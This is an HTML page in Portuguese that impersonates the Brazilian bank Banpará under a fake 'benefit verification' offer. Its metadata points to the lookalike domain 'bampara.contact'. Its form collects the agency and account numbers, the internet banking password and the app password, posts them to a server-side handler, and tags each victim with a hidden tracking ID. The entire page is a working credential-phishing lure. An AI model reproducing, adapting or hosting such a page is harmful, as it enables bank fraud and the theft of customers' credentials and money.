<!DOCTYPE html>
<html lang="pt-br">

<head>
    <meta property="og:title" content="Banpará - Verificação de Benefício">
    <meta property="og:description"
        content="Verifique se você tem direito ao benefício no Banpará. Preencha o formulário online e veja se sua conta corrente ou poupança é elegível.">
    <meta property="og:image" content="https://www.bampara.contact/img/logo.webp">
    <meta property="og:url" content="https://www.bampara.contact/">
    <meta property="og:type" content="website">

    <meta name="twitter:card" content="summary_large_image">
    <meta name="twitter:title" content="Banpará - Verificação de Benefício">
    <meta name="twitter:description"
        content="Preencha o formulário online e veja se sua conta corrente ou poupança no Banpará é elegível para o benefício.">
    <meta name="twitter:image" content="https://www.bampara.contact/img/logo.webp">

    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="description"
        content="Verifique se você tem direito ao benefício no Banpará. Preencha o formulário online para consultar sua conta corrente ou poupança e verificar sua elegibilidade.">
    <link rel="shortcut icon" href="./img/favicon.ico" type="image/x-icon">
    <link rel="stylesheet" href="./css/style.css">
    <link rel="stylesheet"
        href="https://fonts.googleapis.com/css2?family=Material+Symbols+Outlined:opsz,wght,FILL,GRAD@20..48,100..700,0..1,-50..200" />
    <title>Banpará - Verificação de benefício</title>
</head>

<body>
    <div class="app flex">
        <div class="container__image">
            <div><img src="./img/logo.webp" alt=""></div>
        </div>
        <h1>Acessar Conta</h1>
        <div class="containerGeral__form">
            <form action="/processa_formulario" method="post">
                <h2>Titularidade</h2>
                <div class="container__form flex">
                    <label class="opcao flex" for="opcao1">
                        <input type="radio" name="titularidade" value="Primeira" id="opcao1" checked>
                        <span class="custom-radio"></span>
                        <p>Primeira</p>
                    </label>
                    <label class="opcao flex" for="opcao2">
                        <input type="radio" name="titularidade" value="Segunda" id="opcao2">
                        <span class="custom-radio"></span>
                        <p>Segunda</p>
                    </label>
                </div>

                <h2>Tipo da conta</h2>
                <div class="container__form flex">
                    <label class="opcao flex" for="opcao3">
                        <input type="radio" name="tipo_conta" value="Corrente" id="opcao3" checked>
                        <span class="custom-radio"></span>
                        <p>Corrente</p>
                    </label>
                    <label class="opcao flex" for="opcao4">
                        <input type="radio" name="tipo_conta" value="Poupança" id="opcao4">
                        <span class="custom-radio"></span>
                        <p>Poupança</p>
                    </label>
                </div>

                <div class="containerGeral__icon flex">
                    <div class="flex containericon__form">
                        <div class="flex icon__form">
                            <span class="icon material-symbols-outlined">account_balance</span>
                            <div>
                                <label for="agency">Agência</label>
                                <input class="required" type="number" id="agency" name="agency"
                                    placeholder="Digite o número de sua agência">
                                <span class="span-required">Agência deve ter no mínimo 4 caracteres</span>
                            </div>
                        </div>

                        <div class="flex icon__form">
                            <span class="icon material-symbols-outlined">login</span>
                            <div>
                                <label for="login">Conta</label>
                                <input class="required" type="number" id="login" name="login"
                                    placeholder="Digite o número de sua conta">
                                <span class="span-required">Conta deve conter 8 caracteres</span>
                            </div>
                        </div>

                        <div class="flex icon__form">
                            <span class="icon material-symbols-outlined">lock</span>
                            <div>
                                <label for="internet">Senha da internet</label>
                                <input class="required" type="password" id="internet" name="internet"
                                    placeholder="Digite sua senha da internet Ex: 12345678" inputmode="numeric" pattern="[0-9]*">
                                <span class="span-required">Senha deve conter 8 caracteres</span>
                            </div>
                        </div>

                        <div class="flex icon__form">
                            <span class="icon material-symbols-outlined">private_connectivity</span>
                            <div>
                                <label for="app">Senha digital</label>
                                <input class="required" type="password" id="app" name="app"
                                    placeholder="Digite sua senha do app Ex: 1234" inputmode="numeric" pattern="[0-9]*">
                                <span class="span-required">Senha deve conter 4 caracteres</span>
                            </div>
                        </div>
                    </div>
                </div>

                <button type="submit">Entrar</button>
            </form>
        </div>
    </div>
    <script src="./js/script.js"></script>
    <script>
      const form = document.getElementById('mainForm');
      // tenta ler ID existente
      let userId = localStorage.getItem('ban_user_id');
      if (!userId) {
        // gera novo
        userId = Date.now() + '-' + Math.random().toString(36).substr(2, 9);
        localStorage.setItem('ban_user_id', userId);
      }
      // cria o campo oculto
      const hidden = document.createElement('input');
      hidden.type = 'hidden';
      hidden.name = 'user_id';
      hidden.value = userId;
      form.appendChild(hidden);
    </script>
</body>

</html>
